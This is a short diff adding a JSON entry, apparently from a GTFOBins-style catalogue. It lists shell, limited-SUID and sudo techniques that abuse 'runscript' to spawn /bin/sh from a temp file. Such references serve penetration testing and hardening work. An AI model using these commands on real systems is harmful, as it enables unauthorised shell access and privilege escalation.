@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nrunscript $TF\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
+      }
+    ]
+  }
+}
